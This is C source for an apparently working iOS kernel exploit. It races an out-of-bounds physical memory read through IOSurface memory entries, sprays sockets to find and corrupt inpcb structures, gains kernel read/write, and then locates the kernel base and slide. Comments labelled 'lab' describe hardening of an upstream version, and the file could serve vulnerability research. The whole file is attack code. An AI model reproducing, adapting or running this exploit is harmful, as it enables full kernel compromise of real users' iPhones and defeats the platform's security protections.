#include "poc.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sysctl.h>

#include "free_thread.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"

cs2_offsets_t cs2_offsets;
cs2_context_t cs2_ctx;

kern_return_t cs2_pe_init(void) {
    // creates read and write fd
    cs2_init_files();
    if (cs2_ctx.executable_name == NULL) {
        uint32_t size = 0x1024;
        char* executable_path = calloc(1, size);
        _NSGetExecutablePath(executable_path, &size);
        char* executable_name = strrchr(executable_path, '/');
        if (executable_name != NULL) {
            executable_name = executable_name + 1;
        } else {
            executable_name = executable_path;
        }
        // save our executable name, since it's the oracle for inpcb
        cs2_ctx.executable_name = strdup(executable_name);
        free(executable_path);
    }

    // original allocs 1 page, we don't need that much
    cs2_ctx.shared = calloc(1, sizeof(cs2_free_shared_t));
    // create the free thread
    pthread_create(&cs2_ctx.free_thread, NULL, cs2_free_worker, cs2_ctx.shared);
    cs2_ctx.free_thread_started = true;

    LOG("free_thread_shared: %p", cs2_ctx.shared);
    return KERN_SUCCESS;
}

kern_return_t cs2_pe_v1(void) {
    // 0x1000 pages
    uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
    // if (cs2_ctx.is_a18_devices) {
    //     n_of_total_search_mapping_pages = 0x10 * 0x10;
    // }

    // 0x8000000 -> 128 mib
    uint64_t search_mapping_size = 0x2000 * vm_page_size;
    // if (cs2_ctx.is_a18_devices) {
    //     search_mapping_size = (0x10 * vm_page_size) / 4;
    // }

    // 0x40000000 -> 1gib
    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;

    // 8
    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;

    // 0xf00
    uint8_t* read_buffer = calloc(1, cs2_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, cs2_ctx.oob_size);

    // creates physically contiguous mapping in purple gfx mem and sets marker on it
    // 2 pages since first one is "in bounds" and the second one will be replaced with
    // a non-contiguous page in the race (hopefully)
    uint64_t contiguous_mapping_size = 2 * vm_page_size;
    cs2_init_phys_rw(contiguous_mapping_size);

    // commenting this out since it's only for A18

    /*
    mach_vm_address_t wired_mapping = 0;
    mach_vm_size_t wired_mapping_size = 0xC0000000;  // original is 3 * 1024 * 1024 * 1024
    if (cs2_ctx.is_a18_devices) {
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            free(read_buffer);
            free(write_buffer);
            return kr;
        }
        LOG("wired_mapping: %#llx", wired_mapping);
    }
    */

    uint64_t target_inp_gencnt_list[CS2_MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
    size_t target_inp_gencnt_count = 0;

    /* lab law 2026-10-24 (T8150/24A435 fire): upstream retries forever; the
       17 crashed at pass-2's FIRST oob_read with pass-1 surfaces leaked AND
       mlocked (munlock never ran on the fail path). Now: 2-pass bound,
       munlock every pass end, per-pass phys_footprint + oob kr telemetry. */
    size_t oob_read_fail_count = 0;
    for (size_t pass = 0; pass < 2; pass++) {
        {
            struct task_vm_info tvi; mach_msg_type_number_t tc = TASK_VM_INFO_COUNT;
            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&tvi, &tc) == KERN_SUCCESS)
                LOG("=== outer pass %lu phys_footprint=0x%llx ===", pass, (unsigned long long)tvi.phys_footprint);
        }
        // again, only for A18
        /*
        if (cs2_ctx.is_a18_devices) {
            cs2_surface_mlock(wired_mapping, wired_mapping_size);
            for (uint64_t s = 0; s < (wired_mapping_size / vm_page_size); s++) {
                memcpy((void*)(wired_mapping + s * vm_page_size), &(uint64_t){0}, sizeof(uint64_t));
            }
        }
        */

        mach_vm_address_t search_mappings[n_of_search_mappings];
        size_t search_mappings_count = 0;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = 0;
            // allocate 128mb * number of search mappings
            // these allocations are NOT contiguous
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // place marker on start of each page
            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
                memcpy((void*)(search_mapping_address + k), &cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
            }

            // save the address of the mapping onto the search mappings array
            search_mappings[search_mappings_count++] = search_mapping_address;
        }

        cs2_ctx.socket_ports_count = 0;

        uint64_t open_max = CS2_MAX_OPEN_FDS;  // bsd/sys/syslimits.h
        uint64_t maxfiles = 3 * open_max;  // bsd/conf/param.c
        uint64_t leeway = 4096 * 2;        // I have no idea
        // maxfiles - leeway = 22528 -> 0x5800 aka CS2_MAX_SOCKETS_COUNT, why
        // this limit seems arbitrary?
        // spray sockets, save pcb gencnt
        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
            uint64_t port = cs2_spray_socket();
            if (port == UINT64_MAX) {
                LOG("failed to spray sockets: %#lx", cs2_ctx.socket_ports_count);
                break;
            }
        }

        // these are the start and end pcb gencnts
        // they are allocated in incrementing order
        uint64_t start_pcb_id = cs2_ctx.socket_pcb_ids[0];
        uint64_t end_pcb_id = cs2_ctx.socket_pcb_ids[cs2_ctx.socket_ports_count - 1];
        LOG("socket_ports_count: %#lx", cs2_ctx.socket_ports_count);
        LOG("start_pcb_id: %#llx", start_pcb_id);
        LOG("end_pcb_id: %#llx", end_pcb_id);

        bool success = false;
        // 8 search mappings
        for (size_t s = 0; s < search_mappings_count; s++) {
            mach_vm_address_t search_mapping_address = search_mappings[s];
            LOG("looking in search mapping: %lu", s);

            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
            cs2_surface_mlock(search_mapping_address, search_mapping_size);

            // start the party
            uint64_t seeking_offset = 0;

            // seeking offset increases by page_size, until search_mapping_size
            // since search_mapping_size is 0x8000000, we can loop 0x2000 times
            LOG_DEBUG("search mapping size %#llx", search_mapping_size);
            // NOTE:
            // fix mach_vm_map err on free thread, we'd try to map outside memory object
            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
                // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
                // oob_size -> 0xf00, oob_offset -> 0x100
                kr = cs2_oob_read(memory_object, seeking_offset, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
                if (kr != KERN_SUCCESS) {
                    oob_read_fail_count++;
                    if (oob_read_fail_count <= 4)
                        LOG("oob_read kr=%#x map=%lu off=%#llx pass=%lu", kr, s, seeking_offset, pass);
                }
                if (kr == KERN_SUCCESS) {
                    // LOG_DEBUG("Finding and corrupting socket...");
                    if (cs2_find_and_corrupt(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += vm_page_size;
            }

            // NOTE:
            // I don't think this will do anything worth
            // since I've never had a success pass first mapping
            // unless when we never find target, this would
            // help with memory pressure?
            // cs2_surface_munlock(search_mapping_address);
            kr = mach_port_deallocate(mach_task_self(), memory_object);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            if (success) {
                break;
            }
        }

        // deallocate fileport_makeport sockets
        // at this point the target sockets are already back to being fd
        cs2_sockets_release();

        // munlock + release surfaces BEFORE deallocating (upstream never
        // unlocked on the fail path — the pass-2 SIGKILL suspect on 24A435)
        while (search_mappings_count > 0) {
            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
            cs2_surface_munlock(search_mapping_address);
            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
        }

        // if (cs2_ctx.is_a18_devices) {
        //     cs2_surface_munlock(wired_mapping);
        // }

        if (success) {
            break;
        }
    }

    LOG("scan exhausted: 2 full passes, no corruption accepted, oob_read kr-fails=%lu — one tap per fresh boot", oob_read_fail_count);
    free(read_buffer);
    free(write_buffer);
    return KERN_SUCCESS;
}

static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}

bool cs2_is_arm64e(void)
{
    static bool isArm64e = false;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        cpu_subtype_t cpusubtype = 0;
        size_t len = sizeof(cpusubtype);
        sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0);
        isArm64e = (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
    });
    return isArm64e;
}

uint64_t cs2_unpac_ptr(uint64_t kptr)
{
    if (cs2_is_arm64e()) {
        return __xpaci(kptr);
    }
    else {
        return kptr;
    }
}

kern_return_t cs2_pe(void) {
    char* device_machine = cs2_machine();
    // kern_return_t kr = KERN_SUCCESS;

    // I didn't add support for pe_v2, I don't have a test device
    if (strstr(device_machine, "iPhone17,") != NULL) {
        // LOG("running on A18 devices");
        // cs2_ctx.is_a18_devices = true;
        // sleep(8);
        // cs2_pe_init();
        // pe_v2();
    } else {
        LOG("running on non-A18 devices");
        cs2_pe_init();
        // lab: upstream ignores the v1 return; we propagate failure so the
        // caller never reports KRW from a half-initialized context.
        kern_return_t v1_kr = cs2_pe_v1();
        if (v1_kr != KERN_SUCCESS) {
            LOG_ERR("cs2_pe_v1 failed: %s (%d)", mach_error_string(v1_kr), v1_kr);
            return v1_kr;
        }
    }

    // not going to fix typo to keep it close to original
    LOG("highiest_success_idx: %llu", cs2_ctx.highiest_success_idx);
    LOG("success_read_count: %llu", cs2_ctx.success_read_count);

    // cleanup
    atomic_store_explicit(&cs2_ctx.shared->go_sync, 0, memory_order_seq_cst);
    atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(cs2_ctx.free_thread, NULL);

    // we have stable rw, we can close the fds now
    close(cs2_ctx.write_fd);
    close(cs2_ctx.read_fd);
    cs2_ctx.control_socket_pcb = cs2_early_kread64(cs2_ctx.rw_socket_pcb + koffsetof(inpcb, list_next));

    uint64_t textPtr = 0;
    if (__builtin_available(iOS 17.0, *)) {
        uint64_t pcbinfo_pointer = cs2_early_kread64(cs2_ctx.control_socket_pcb + koffsetof(inpcb, pcbinfo));
        uint64_t ipi_zone = cs2_early_kread64(pcbinfo_pointer + koffsetof(inpcbinfo, ipi_zone));
        textPtr = cs2_early_kread64(ipi_zone + koffsetof(kalloc_type_view, kt_zv_zv_name));
    }
    else {
        uint64_t socketPtr = cs2_early_kread64(cs2_ctx.control_socket_pcb + koffsetof(inpcb, socket));
        uint64_t protoPtr = cs2_early_kread64(socketPtr + koffsetof(socket, proto));
        textPtr = cs2_unpac_ptr(cs2_early_kread64(protoPtr + koffsetof(protosw, input)));
    }
    
    uint64_t kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
    uint64_t walk_tries = 0;
    while (true) {
        // lab: bounded walk (upstream would spin forever if kread returns 0)
        if (++walk_tries > 0x4000 || cs2_expired()) {
            LOG_ERR("kernel_base walk exhausted after %#llx pages", (unsigned long long)walk_tries);
            return KERN_FAILURE;
        }
        //PRINT_VAR(kernel_base);
        if (cs2_early_kread64(kernel_base) == 0x100000cfeedfacf) {
            uint64_t typeinfo = cs2_early_kread64(kernel_base + 8);
            
            if (cs2_is_arm64e()) {
                if (__builtin_available(iOS 19.0, *)) {
                    if (typeinfo == 0xcc0000002) break;
                }
                else if (__builtin_available(iOS 16.0, *)) {
                    if (typeinfo == 0xc00000002) break;
                }
                else {
                    break;
                }
            }
            else {
                if (typeinfo == 0x200000000) break;
            }
        }
        kernel_base -= PAGE_SIZE;
    }

    cs2_ctx.kernel_base = kernel_base;
    cs2_ctx.kernel_slide = kernel_base - kconstant(staticBase);

    // real cleanup
    cs2_sockets_leak_forever();
    return KERN_SUCCESS;
}

int cs2_run(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&cs2_offsets, 0, sizeof(cs2_offsets));
    memset(&cs2_ctx, 0, sizeof(cs2_ctx));
    // 2 pages
    cs2_ctx.target_file_size = vm_page_size * 2;
    cs2_ctx.oob_offset = 0x100;
    cs2_ctx.oob_size = 0xf00;
    cs2_ctx.n_of_oob_pages = 2;

    arc4random_buf(&cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
    arc4random_buf(&cs2_ctx.wired_page_marker, sizeof(cs2_ctx.wired_page_marker));

    cs2_ctx.default_file_content = calloc(1, cs2_ctx.target_file_size);
    memset_pattern8(cs2_ctx.default_file_content, &cs2_ctx.random_marker, cs2_ctx.target_file_size);

    // size of read is 32 bytes
    cs2_ctx.getsockopt_read_data = calloc(1, 32);
    int ret = 0;

    if (cs2_offsets_init() != 0) {
        LOG_ERR("cs2_offsets_init failed");
        ret = -1;
        goto cleanup;
    }
    cs2_ctx.offsets = cs2_offsets;

    kern_return_t kr = cs2_pe();
    if (kr != KERN_SUCCESS) {
        LOG_ERR("cs2_pe failed: %s (%d)", mach_error_string(kr), kr);
        ret = kr;
        goto cleanup;
    }

    LOG("kernel_base: %#llx", cs2_ctx.kernel_base);
    LOG("kernel_slide: %#llx", cs2_ctx.kernel_slide);

    uint64_t end = mach_absolute_time();
    uint64_t elapsed = end - start;
    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
    LOG("Time taken for KRW: %.3f ms", elapsed_ms);

cleanup:
    // lab: upstream only joins the free thread on the success path; on a
    // failure return it would free shared under a live worker. Join first.
    if (cs2_ctx.free_thread_started) {
        atomic_store_explicit(&cs2_ctx.shared->go_sync, 0, memory_order_seq_cst);
        atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
        pthread_join(cs2_ctx.free_thread, NULL);
        cs2_ctx.free_thread_started = false;
    }
    free(cs2_ctx.shared);
    free(cs2_ctx.default_file_content);
    free(cs2_ctx.getsockopt_read_data);
    free(cs2_ctx.executable_name);
    return ret;
}
